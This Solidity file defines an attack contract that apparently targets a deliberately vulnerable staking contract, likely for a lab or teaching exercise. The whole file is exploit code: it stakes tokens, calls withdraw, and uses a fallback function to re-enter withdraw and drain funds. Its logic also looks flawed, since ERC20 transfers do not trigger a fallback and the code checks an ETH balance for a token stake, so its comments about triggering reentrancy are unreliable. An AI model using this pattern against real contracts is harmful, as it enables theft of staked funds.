// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableStaking.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackContract {
    VulnerableStaking public staking;
    IERC20 public token;
    address public owner;

    constructor(address _staking, address _token) {
        staking = VulnerableStaking(_staking);
        token = IERC20(_token);
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        require(msg.sender == owner, "Not owner");

        token.approve(address(staking), amount);
        staking.stake(amount);

        staking.withdraw(); // triggers reentrancy
    }

    // fallback function triggers when receiving tokens
    fallback() external {
        if (address(staking).balance > 0) {
            staking.withdraw();
        }
    }
}